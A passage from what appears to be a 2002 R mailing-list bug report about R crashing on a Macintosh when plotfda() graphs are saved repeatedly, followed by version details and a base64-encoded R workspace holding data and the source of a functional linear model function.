# repeat the process - run plotfda
plotfda()
# and save the graph as Save As... using a different filename

# repeat the process a second time
plotfda()
# and R crashes when Save As... is selected.


--please do not edit the information below--

Version:
  platform = ppc-apple-macos
  arch = ppc
  os = MacOS
  system = ppc, MacOS
  status =
  major = 1
  minor = 5.1
  year = 2002
  month = 06
  day = 17
  language = R

Search Path:
  .GlobalEnv, colldata, file:Hard Disk:Documents:People:Jim 
Ramsay:functions:.Rdata, package:splines, package:ctest, Autoloads, 
package:base


-- 
Tim.Cole@ich.ucl.ac.uk   Phone +44(0)20 7905 2666  Fax +44(0)20 7242 2723
Paed Epidemiology & Biostats, Institute of Child Health, London WC1N 1EH, UK
--============_-1180632878==_============
Content-Id: <p05111b03b9a0ed6293f0@[131.111.99.150].0.0>
Content-Type: multipart/appledouble; boundary="============_-1180632878==_D============"

--============_-1180632878==_D============
Content-Transfer-Encoding: base64
Content-Type: application/applefile; name="%_RData"
Content-Disposition: attachment; filename="%_RData"
 ; modification-date="Sun, 1 Sep 2002 23:15:31 +0100"

AAUWBwACAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAADAAAAPgAAAAYAAAAJAAAARAAAACAA
AAAIAAAAZAAAABAuUkRhdGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUF
XBMFBVwTS20MAAUOEuI=
--============_-1180632878==_D============
Content-Type: application/octet-stream; name="_RData"
 ; x-mac-type="00000000"
 ; x-mac-creator="00000000"
Content-Disposition: attachment; filename="_RData"
Content-Transfer-Encoding: base64

UkRYMgpYCgAAAAIAAQUBAAEEAAAABAIAAAABAAAUCQAAAAouVHJhY2ViYWNrAAAA/gAA
BAIAAAABAAAUCQAAAAVDVi5NUgAABg4AAAAWQDbSmV7mXXJARyJBmZZpkkBKue/YpxEd
QEwIAS+3gkVATJatNjILYEBLg+qlaeKqQEtJOZpftMZASWaplZuTRkBIzauK/OywQElE
1SaBccdASYMAazIvrUBJqGD/blFKQEeD9KXDhaJARrJVYE0FxUBG8+FqjW0GQEeqOxrd
cZhASghYiD6HHUBMxNOCIdgIQFDDf7fYyRdAUv4oTa4OckBUiOj9XCwrQFTP5uC5s3gA
AAQCAAAAAQAAFAkAAAAFbmFtZXMAAAQQAAAAFgAABAkAAAACWDAAAAQJAAAAAlgxAAAE
CQAAAAJYMgAABAkAAAACWDMAAAQJAAAAAlg0AAAECQAAAAJYNQAABAkAAAACWDYAAAQJ
AAAAAlg3AAAECQAAAAJYOAAABAkAAAACWDkAAAQJAAAAA1gxMAAABAkAAAADWDExAAAE
CQAAAANYMTIAAAQJAAAAA1gxMwAABAkAAAADWDE0AAAECQAAAANYMTUAAAQJAAAAA1gx
NgAABAkAAAADWDE3AAAECQAAAANYMTgAAAQJAAAAA1gxOQAABAkAAAADWDIwAAAECQAA
AANYMjEAAAD+AAAEAgAAAAEAABQJAAAAB01lYW4uTVIAAAYOAAAAFkBguuTjnFt5QEip
ST9XV6FAOHp/hxonPEArCgNvhEXhQCHuZPhVHOpAGSJvj530cUAT54ouYWZRQA0XsJAe
Is1AB2B1kjI/AEAEc2q+OgYYQALRj7O0ngJAANiSsYo/1UAAQcfRVnVdP/6JBcEAoERA
AVuAPk1U10ABJf50tFJhQAM6r2JuTqVAB0mXi3iPp0ANmhcgc6w2QA2z3WBWHCFAEAcD
zwHr0kAPsXeQkardAAAEAgAAA/8AAAQQAAAAFgAABAkAAAACWDAAAAQJAAAAAlgxAAAE
CQAAAAJYMgAABAkAAAACWDMAAAQJAAAAAlg0AAAECQAAAAJYNQAABAkAAAACWDYAAAQJ
AAAAAlg3AAAECQAAAAJYOAAABAkAAAACWDkAAAQJAAAAA1gxMAAABAkAAAADWDExAAAE
CQAAAANYMTIAAAQJAAAAA1gxMwAABAkAAAADWDE0AAAECQAAAANYMTUAAAQJAAAAA1gx
NgAABAkAAAADWDE3AAAECQAAAANYMTgAAAQJAAAAA1gxOQAABAkAAAADWDIwAAAECQAA
AANYMjEAAAD+AAAEAgAAAAEAABQJAAAABVNELk1SAAAGDgAAABZAPovCqF681kA20gPt
ine+QCorN2X8ugBAHlFQA+1uL0AUgVB9J1cgQAup0Sh393lABbl7rI9HoT/9jyh7iSK6
P/cxZa3bOsk/9Ku5cQTvXj/zNCwJ4AOeP/FKCIuPcVA/7pVKvhenyj/ruMxNgl/AP+/f
NnVboJ8/8DuP4XEDBT/0BgMJDsCQP/rMU40NkAlAA9l2p2K1+UAGkL+AYYTuQApUXm7m
97NACmJWP+EBFQAABAIAAAP/AAAEEAAAABYAAAQJAAAAAlgwAAAECQAAAAJYMQAABAkA
AAACWDIAAAQJAAAAAlgzAAAECQAAAAJYNAAABAkAAAACWDUAAAQJAAAAAlg2AAAECQAA
AAJYNwAABAkAAAACWDgAAAQJAAAAAlg5AAAECQAAAANYMTAAAAQJAAAAA1gxMQAABAkA
AAADWDEyAAAECQAAAANYMTMAAAQJAAAAA1gxNAAABAkAAAADWDE1AAAECQAAAANYMTYA
AAQJAAAAA1gxNwAABAkAAAADWDE4AAAECQAAAANYMTkAAAQJAAAAA1gyMAAABAkAAAAD
WDIxAAAA/gAABAIAAAABAAAUCQAAAAhjb2xsZGF0YQAABxMAAAAZAAAEDQAAACwAAAdz
AAAHdAAAB3UAAAd2AAAHdwAAB3gAAAd5AAAHegAAB3sAAAd8AAAHfQAAB34AAAd/AAAH
gAAAB4EAAAeCAAAHgwAAB4QAAAeFAAAHhgAAB4cAAAeIAAAHiQAAB4oAAAeLAAAHjAAA
B40AAAeOAAAHjwAAB5AAAAeRAAAHkgAAB5MAAAeUAAAHlQAAB5YAAAeXAAAHmAAAB5kA
AAeaAAAHmwAAB5wAAAedAAAHngAABA0AAAAsAAUsFwAFQpAABTIJAAUrpgAFAwsABRn9
AATtNwAE2RcABOi/AATLLAAEzfQABOOTAAStuAAE+rUABS5xAAU6jAAFRk0ABTEJAAUd
cgAFRKwABQa9AAVGWwAFKTIABTmCAAUeTwAFSXkABT/kAAT/8QAE9ckABM73AARvzAAD
/IUAA09FAATyFAAD/4QABCh1AAS9vQAEsT4ABNb0AASGKQAEjv0ABPhnAASnAAAEYFYA
AAQOAAAALECZmx64UeuFQJmX9cKPXClAmbz1wo9cKUCZtI9cKPXDQJnRwo9cKPZAmdSP
XCj1w0CZ6Sj1wo9cQJnFo9cKPXFAmcKPXCj1w0CZ18KPXCj2QJnKPXCj1wpAmaX1wo9c
KUCZwnrhR64UQJm0wo9cKPZAmbiZmZmZmkCZydcKPXCkQJnDcKPXCj1AmbrhR64Ue0CZ
uxR64UeuQJnDXCj1wo9AmccAAAAAAECZxh64UeuFQJnSKPXCj1xAmdIAAAAAAECZ3rhR
64UfQJneFHrhR65AmeKFHrhR7ECZ3lwo9cKPQJnm9cKPXClAme2uFHrhSECZ78zMzMzN
QJnwo9cKPXFAmfMKPXCj10CZ++uFHrhSQJoDUeuFHrhAmg+PXCj1w0CaFVHrhR64QJoV
Cj1wo9dAmiaZmZmZmkCaK7hR64UfQJo1j1wo9cNAmjYUeuFHrkCaOj1wo9cKQJpWUeuF
HrgAAAQNAAAALAAA3o4AAOL+AADX+wAA0EkAANsEAAC/FgAAzrgAAMbRAADQSgAAvaYA
AMkhAADwsAAAxC4AANtdAADL0gAAx8EAANE9AADE9wAAvocAALT1AACtQgAAsbkAAKz0
AACl/AAAorYAAKFXAACf1wAAml8AAJTQAACOwwAAnLMAAIEtAAB3nQAAkYwAAJpfAABz
8gAAgD8AAHdHAABwygAAa2AAAFgbAABYHAAAWF0AAEyJAAAEDQAAACwAAFpAAABW+AAA
UqkAAFwJAABErgAAUEgAAE0XAABLuAAASJ8AAEosAABmvQAAR+IAAEzmAABL/wAARHkA
AEd1AABBTQAAQQkAAD3CAAA5mQAAPsYAADigAAA4jAAAMs4AADCBAAAtuAAALxMAACq/
AAAmhQAAMNAAACgxAAAk3AAAG50AACEmAAAanQAAFz4AABdnAAAVNgAAE28AABGDAAAO
agAAEGMAAA7JAAANEAAABA0AAAAsAAAqhgAAKiUAACyjAAAkqwAAJn4AACXQAAAlMgAA
I9gAACVEAAA4bwAAJBUAACmqAAAkEwAAInkAACFSAAAfDAAAHyUAAB5GAAAaKAAAHNwA
ABldAAAYfwAAFeQAABTRAAAUIAAAErQAABMLAAAQmAAAFSMAABG6AAATfQAAD5wAAAtq
AAAN4QAACyUAAAkXAAAKJQAACasAAAmiAAAIRQAAB9oAAAi0AAAHpQAABXIAAAQNAAAA
LAAAFogAABexAAAU8wAAFfgAABU2AAAVKAAAFCIAABSlAAAiNQAAFA0AABd0AAASYwAA
EbMAABDKAAAQ2gAAD7UAAA9UAAAObQAADlgAAA1MAAAMwwAADAUAAArAAAAK6gAAChUA
AAp/AAAJbwAADC8AAArRAAALpAAAChgAAAeDAAAGTgAABx0AAAVzAAAFYQAABfMAAAX4
AAAFsgAABNsAAASxAAAE9wAAA5cAAAK+AAAEDQAAACwAAA8QAAAOMQAADmIAAA5KAAAN
jQAADVEAAA4EAAAW7wAADh4AABFRAAAMUQAACvsAAAn5AAAKRwAACcwAAAmrAAAI+gAA
CaUAAAj2AAAIlQAAB+oAAAdMAAAHZwAABwsAAAc3AAAGfgAACFYAAAf4AAAIQgAAB/IA
AAYrAAAE6wAABBMAAAR/AAAEAAAAA5AAAAR1AAAEBQAAA60AAANrAAADFgAAAsoAAAI8
AAABxAAABA0AAAAsAAAJwQAACiAAAAmhAAAJMwAACVoAAAn+AAAQdQAACaMAAAqxAAAJ
BAAACGMAAAa4AAAGmQAABpoAAAbUAAAGsgAABqIAAAYyAAAGHgAABbQAAAVPAAAFfwAA
BTkAAAUbAAAE2QAABmAAAAafAAAGmQAABekAAATzAAAEYwAAA4sAAALtAAADbgAAAuUA
AALZAAAC9wAAAtgAAAKaAAAChAAAAhMAAAHpAAABjwAAAXwAAAQNAAAALAAAB34AAAey
AAAHlwAAB0wAAAfYAAANFQAAB5UAAAiDAAAHrgAABsIAAAWhAAAFyQAABSYAAAWKAAAF
bwAABYQAAAT5AAAE6QAABO8AAARyAAAEdwAABDAAAAR2AAAD9AAABRMAAAU5AAAFvgAA
BLsAAARZAAADqwAAAzYAAAKXAAACQQAAAk8AAAKKAAACAQAAAl4AAAJDAAACRwAAAeIA
AAFuAAABUAAAAUoAAAEdAAAEDQAAACwAAAUoAAAFHAAABWgAAAVPAAAJdwAABbgAAAXJ
AAAFKgAABNYAAAQOAAAD3AAAA38AAAOMAAADrgAAA7sAAAOCAAADmgAAA3wAAANYAAAD
gQAAA0kAAANoAAADIgAABAoAAARLAAAEwQAABCMAAAOYAAADFQAAAxUAAALsAAACPQAA
AcUAAAIuAAAB8wAAAdAAAAG4AAAB5wAAAZkAAAE1AAABGAAAATYAAADeAAAA7AAABA0A
AAAsAAAD+wAABCkAAAQdAAAHiAAABI8AAASRAAAENwAAA8QAAANmAAADIQAAAxkAAALg
AAAC2gAAAwoAAAMLAAAC8AAAAwMAAALMAAAC8QAAAtUAAALiAAACwQAAA5AAAAONAAAE
GgAAA08AAAM5AAAC2gAAAl8AAAJwAAACKAAAAaYAAAFyAAABpwAAAZ4AAAFYAAABZgAA
AVsAAAEdAAAA4wAAANIAAADkAAAA4wAAAMwAAAQNAAAALAAAA1QAAAONAAAG2AAABAcA
AAPoAAAD3AAAA4oAAAMfAAACwgAAAoIAAAKeAAACPgAAAogAAAKDAAACiwAAAt4AAAJd
AAACewAAApkAAAJwAAACcwAAA1QAAANpAAADsAAAAxgAAAL0AAACfgAAAnAAAAI6AAAC
BwAAAfIAAAGvAAABPgAAAWsAAAFNAAABQgAAARkAAAD/AAAA8wAAANIAAACyAAAA6gAA
AL4AAACoAAAEDQAAACwAAANGAAAGcAAAA70AAAOsAAADYgAAAzUAAALrAAACmwAAApEA
AAKbAAACPgAAAlIAAAICAAACTgAAAnUAAAJVAAACXgAAAn4AAAJKAAACLwAAAxwAAAMZ
AAADTgAAAs8AAALBAAACeQAAAkQAAAITAAACIAAAAc4AAAG7AAABjQAAAR4AAAFVAAAB
TQAAAPkAAAEXAAAA3QAAAMkAAADhAAAAxgAAAMkAAADDAAAAfwAABA0AAAAsAAAFhgAA
AzsAAANAAAAC/gAAAuYAAALIAAACgQAAAmMAAAJJAAACHgAAAkMAAAH6AAACAQAAAlUA
AAILAAACJAAAAj4AAAIgAAACLAAAAsQAAALLAAADJgAAAnYAAAKfAAACQwAAAkYAAAHf
AAACPAAAAcQAAAG4AAABdQAAAUAAAAEOAAABIQAAAOcAAADNAAAAvgAAAMUAAADQAAAA
ugAAAJkAAACjAAAAmwAAAIcAAAQNAAAALAAAA2MAAAPBAAADEAAAAuAAAAKPAAACdQAA
AkgAAAJsAAACLQAAAiUAAAItAAAB/wAAAhsAAAIZAAACUAAAAlsAAAJsAAACMAAAAscA
AAL2AAADVgAAAooAAAKbAAACbQAAAjkAAAInAAACEgAAAbMAAAHRAAABlQAAAWsAAAEQ
AAAA5gAAAP8AAADUAAAAmQAAAMgAAADeAAAAxAAAAJsAAACwAAAAlAAAAJgAAACJAAAE
DQAAACwAAAMtAAAC7gAAArwAAAKmAAACeAAAAlEAAAJtAAACUwAAAgoAAAIeAAAB7AAA
AegAAAHXAAACFAAAAhsAAAImAAACXgAAAp4AAAK+AAADAgAAAlwAAAKfAAACTQAAAhMA
AAIZAAAB9AAAAgIAAAHHAAABjQAAAYcAAAFgAAABBQAAANYAAADcAAAAtgAAAK4AAACz
AAAAxQAAAM4AAACkAAAAjgAAAKEAAACXAAAAigAABA0AAAAsAAADWQAAAuQAAAL3AAAC
0QAAAq8AAALZAAAC1gAAAnIAAAKGAAACVgAAAnAAAAI4AAACPQAAAncAAAKDAAAC1AAA
Ay8AAANJAAADnQAAAvcAAALsAAACggAAAnQAAAJzAAACRAAAAiAAAAIiAAAB+AAAAbUA
AAGkAAABZgAAAPgAAADiAAAA5AAAAPEAAADBAAAA2QAAAMcAAADTAAAAwQAAAKcAAADd
AAAAlwAAALUAAAQNAAAALAAAAsoAAAL0AAAC7QAAAsEAAALAAAACjwAAAo4AAAJ3AAAC
pQAAAp0AAAI3AAACSAAAAkYAAAJoAAAChgAAA3sAAAO0AAADqAAAAy4AAALlAAACngAA
AjwAAAJyAAACWQAAAkcAAAJEAAACAwAAAcIAAAHiAAABjgAAATIAAADsAAAAqwAAAPAA
AADcAAAAxQAAALoAAADDAAAA1QAAALYAAAClAAAAwQAAALIAAADOAAAEDQAAACwAAANU
AAADVQAAAyYAAANaAAADIQAAAxgAAAL1AAAC+QAAAuoAAAKLAAACrgAAAmcAAAKOAAAD
TgAABB0AAAR1AAAElQAAA2cAAANSAAAC3QAAArEAAAKpAAAC2AAAAoYAAAKpAAACRgAA
AhMAAAHdAAABkgAAAUUAAAEmAAAA2wAAAKwAAAD/AAAA5gAAAMcAAADpAAAA3AAAAM8A
AADbAAAAxQAAAL0AAAC+AAAAuQAABA0AAAAsAAAEKgAAA9EAAAQPAAAD/AAAA+MAAAO0
AAADlwAAA8gAAAOYAAADTgAAAzUAAAMwAAAEKQAABToAAAXtAAAFoAAABCMAAARYAAAD
ugAAA2gAAAM9AAADJAAAAwYAAAL6AAAC1QAAAmoAAAI7AAACAAAAAXAAAAFeAAABHAAA
ASIAAADcAAABFQAAANsAAADbAAAA6gAAAOQAAAECAAAA8wAAANcAAADNAAAA5gAAAMMA
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
ZWRmID0gMCkAAAQJAAAAAXsAAAQJAAAAAAAABAkAAAA1IyAgVGhpcyBmdW5jdGlvbiBv
bmUgb2YgdGhyZWUgdHlwZXMgb2YgbGluZWFyIG1vZGVsLCAAAAQJAAAAKyMgIGVhY2gg
bW9kZWwgY29uc2lzdGluZyBvZiBhIGNvbnN0YW50IHRlcm0AAAQJAAAARSMgIHBsdXMg
ZWl0aGVyIGEgY29udmVudGlvbmFsIGluZGVwZW5kZW50IHZhcmlhYmxlIG1hdHJpeCBv
ciBhIHNpbmdsZQAABAkAAAA9IyAgZnVuY3Rpb25hbCBpbmRlcGVuZGVudCB2YXJpYWJs
ZS4gIFRoZSBtb2RlbGluZyBwcm9ibGVtIG1heQAABAkAAABCIyAgYmUgZnVuY3Rpb25h
bCBlaXRoZXIgaW4gdGVybXMgb2YgdGhlIGluZGVwZW5kZW50IHZhcmlhYmxlIG9yIGlu
AAAECQAAAEIjICB0ZXJtcyBvZiB0aGUgZGVwZW5kZW50IHZhcmlhYmxlLCBidXQgYXQg
bGVhc3Qgb25lIHZhcmlhYmxlIG11c3QAAAQJAAAAESMgIGJlIGZ1bmN0aW9uYWwuAAAE
CQAAAEIjICBTbW9vdGhpbmcgaXMgY29udHJvbGxlZCBieSB0d28gcGFyYW1ldGVycyBY
TEFNQkRBIGFuZCBZTEFNQkRBLCAAAAQJAAAAPCMgIGNvcnJlc3BvbmRpbmcgdG8gdGhl
IGluZGVwZW5kZW50IGFuZCBkZXBlbmRlbnQgZnVuY3Rpb25hbAAABAkAAAAbIyAgdmFy
aWFibGVzLCByZXNwZWN0aXZlbHkuAAAECQAAAAwjICBBcmd1bWVudDoAAAQJAAAATCMg
IFhGRCAgICAgLi4uIElmIHRoZSBpbmRlcGVuZGVudCB2YXJpYWJsZSBpcyBtdWx0aXZh
cmlhdGUsIGEgZGVzaWduIG1hdHJpeC4AAAQJAAAASCMgICAgICAgICAgICAgIElmIHRo
ZSBpbmRlcGVuZGVudCB2YXJpYWJsZSBpcyBmdW5jdGlvbmFsLCBhICdmZCcgb2JqZWN0
LgAABAkAAABKIyAgWUZEICAgICAuLi4gSWYgdGhlIGRlcGVuZGVudCB2YXJpYWJsZSBp
cyBtdWx0aXZhcmlhdGUsIGEgZGVzaWduIG1hdHJpeC4AAAQJAAAARiMgICAgICAgICAg
ICAgIElmIHRoZSBkZXBlbmRlbnQgdmFyaWFibGUgaXMgZnVuY3Rpb25hbCwgYSAnZmQn
IG9iamVjdC4AAAQJAAAAIiMgIFdUVkVDICAgLi4uIGEgdmVjdG9yIG9mIHdlaWdodHMA
AAQJAAAARyMgIFhMRkQgICAgLi4uIEZvciB0aGUgaW5kZXBlbmRlbnQgdmFyaWFibGUs
IHRoZSBvcmRlciBkZXJpdmF0aXZlIHRvIGJlAAAECQAAACojICAgICAgICAgICAgICBw
ZW5hbGl6ZWQgaWYgYW4gaW50ZWdlciwgb3IAAAQJAAAASiMgICAgICAgICAgICAgIGEg
bGluZWFyIGRpZmZlcmVudGlhbCBvcGVyYXRvciBpZiBhIGZ1bmN0aW9uYWwgZGF0YSBv
YmplY3QuAAAECQAAAEUjICBZTEZEICAgIC4uLiBGb3IgdGhlIGRlcGVuZGVudCB2YXJp
YWJsZSwgdGhlIG9yZGVyIGRlcml2YXRpdmUgdG8gYmUAAAQJAAAAKiMgICAgICAgICAg
ICAgIHBlbmFsaXplZCBpZiBhbiBpbnRlZ2VyLCBvcgAABAkAAABKIyAgICAgICAgICAg
ICAgYSBsaW5lYXIgZGlmZmVyZW50aWFsIG9wZXJhdG9yIGlmIGEgZnVuY3Rpb25hbCBk
YXRhIG9iamVjdC4AAAQJAAAAQSMgIFhMQU1CREEgLi4uIGEgc21vb3RoaW5nIHBhcmFt
ZXRlciBmb3IgdGhlIGluZGVwZW5kZW50IHZhcmlhYmxlAAAECQAAAEEjICBZTEFNQkRB
IC4uLiBhIHNtb290aGluZyBwYXJhbWV0ZXIgZm9yIHRoZSAgIGRlcGVuZGVudCB2YXJp
YWJsZQAABAkAAABBIyAgWk1BVFJOSyAuLi4gYWN0dWFsIHJhbmsgb2YgaW5kZXBlbmRl
bnQgdmFyaWFibGUgbWF0cml4IGZvciB0aGUAAAQJAAAAMSMgICAgICAgICAgICAgIGZ1
bmN0aW9uYWwgRFYvbXVsdGl2YXJpYXRlIElWIGNhc2UAAAQJAAAAHiMgIFJldHVybnM6
ICBhIGxpc3QgY29udGFpbmluZwAABAkAAAAqIyAgQUxQSEEgIC4uLiBhIHZlY3RvciBv
ZiBpbnRlcmNlcHQgdmFsdWVzAAAECQAAAEIjICBSRUdGRCAgLi4uIGEgZnVuY3Rpb25h
bCBkYXRhIG9iamVjdCBmb3IgdGhlIHJlZ3Jlc3Npb24gZnVuY3Rpb24AAAQJAAAAHyMg
IExhc3QgbW9kaWZpZWQ6ICAgNCBKdWx5IDIwMDEAAAQJAAAARSMgICsrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKwAABAkAAAA5IyAgICAgICAgICAgICAgVGhlIG11bHRpdmFyaWF0ZSBJViBhbmQg
ZnVuY3Rpb25hbCBEViBjYXNlAAAECQAAAEUjICArKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysAAAQJAAAA
CAlDViA8LSAwAAAECQAAADQJaWYoaW5oZXJpdHMoeWZkLCAiZmQiKSAmJiAhKGluaGVy
aXRzKHhmZCwgImZkIikpKSB7AAAECQAAABYJCWlmKGlzLm1hdHJpeCh4ZmQpKSB7AAAE
CQAAABkJCQl6bWF0IDwtIGFzLm1hdHJpeCh4ZmQpAAAECQAAAAwJCQlmZCA8LSB5ZmQA
AAQJAAAAAwkJfQAABAkAAAAICQllbHNlIHsAAAQJAAAAMwkJCXN0b3AoIkZpcnN0IGFy
Z3VtZW50IG5vdCBhIHZlY3RvciBvciBhIG1hdHJpeC4iKQAABAkAAAADCQl9AAAECQAA
ABUJCWNvZWYgPC0gZ2V0Y29lZihmZCkAAAQJAAAAFAkJY29lZmQgPC0gZGltKGNvZWYp
AAAECQAAABcJCW5kaW0gPC0gbGVuZ3RoKGNvZWZkKQAABAkAAAAOCQlpZihuZGltIDwg
MikAAAQJAAAANwkJCXN0b3AoIkxpbmVhciBtb2RlbGluZyBpbXBvc3NpYmxlIHdpdGgg
MSByZXBsaWNhdGlvbiIAAAQJAAAABQkJCQkpAAAECQAAABQJCW5yZXAgPC0gbnJvdyh6
bWF0KQAABAkAAAAPCQlpZihuZGltID09IDMpAAAECQAAABMJCQludmFyIDwtIGNvZWZk
WzNdAAAECQAAABAJCWVsc2UgbnZhciA8LSAxAAAECQAAABkJCWJhc2lzZmQgPC0gZ2V0
YmFzaXMoZmQpAAAECQAAABoJCW5iYXNpcyA8LSBiYXNpc2ZkJG5iYXNpcwAABAkAAAAZ
CQlyYW5nZXd0IDwtIHJhbmdlKHd0dmVjKQAABAkAAAAUCQlpZihyYW5nZXd0WzFdIDwg
MCkAAAQJAAAAMgkJCXN0b3AoIldUVkVDIG11c3Qgbm90IGNvbnRhaW4gbmVnYXRpdmUg
dmFsdWVzLiIpAAAECQAAAB4JCWlmKHJhbmdld3RbMV0gPT0gcmFuZ2V3dFsyXSkAAAQJ
AAAADQkJCXd0dmFyIDwtIEYAAAQJAAAAEQkJZWxzZSB3dHZhciA8LSBUAAAECQAAABsJ
CWlmKGxlbmd0aCh3dHZlYykgIT0gbnJlcCkAAAQJAAAAIAkJCXN0b3AoIldUVkVDIG9m
IHdyb25nIGxlbmd0aCIpAAAECQAAABUJCWlmKG1pbih3dHZlYykgPD0gMCkAAAQJAAAA
MAkJCXN0b3AoIkFsbCB2YWx1ZXMgb2YgV1RWRUMgbXVzdCBiZSBwb3NpdGl2ZS4iKQAA
BAkAAAARCQlpZih5bGFtYmRhIDwgMCkAAAQJAAAAPgkJCXdhcm5pbmcoIlZhbHVlIG9m
IExBTUJEQSB3YXMgbmVnYXRpdmUsIGFuZCAwIHVzZWQgaW5zdGVhZC4iAAAECQAAAAUJ
CQkJKQAABAkAAAAdCQlpZih5bGFtYmRhID4gMCAmJiB5TGZkIDwgMCkAAAQJAAAAMwkJ
CXN0b3AoIk9yZGVyIG9mIGRlcml2YXRpdmUgbXVzdCBiZSBub25uZWdhdGl2ZS4iKQAA
BAkAAAAaCQlpZihkaW0oY29lZilbMl0gIT0gbnJlcCkAAAQJAAAAQgkJCXN0b3AoIk51
bWJlciBvZiByb3dzIG9mIFpNQVQgbXVzdCBlcXVhbCBudW1iZXIgb2YgcmVwbGljYXRp
b25zIgAABAkAAAAFCQkJCSkAAAQJAAAAEQkJcCA8LSBuY29sKHptYXQpAAAECQAAABAJ
CWlmKG52YXIgPiAxKSB7AAAECQAAACgJCQliY29lZiA8LSBhcnJheSgwLCBjKG5iYXNp
cywgcCwgbnZhcikpAAAECQAAAAMJCX0AAAQJAAAACAkJZWxzZSB7AAAECQAAACAJCQli
Y29lZiA8LSBtYXRyaXgoMCwgbmJhc2lzLCBwKQAABAkAAAADCQl9AAAECQAAABEJCWlm
KHptYXRybmsgPiBwKQAABAkAAABGCQkJc3RvcCgiU3BlY2lmaWVkIHJhbmsgb2YgWk1B
VCBtdXN0IG5vdCBiZSBncmVhdGVyIHRoYW4gbm8uIGNvbHVtbnMuIgAABAkAAAAFCQkJ
CSkAAAQJAAAAEwkJaWYoem1hdHJuayA8IHApIHsAAAQJAAAAFwkJCXJvb3R3IDwtIHNx
cnQod3R2ZWMpAAAECQAAAC0JCQl6bWF0c3ZkIDwtIHN2ZChzd2VlcCh6bWF0LCAyLCBy
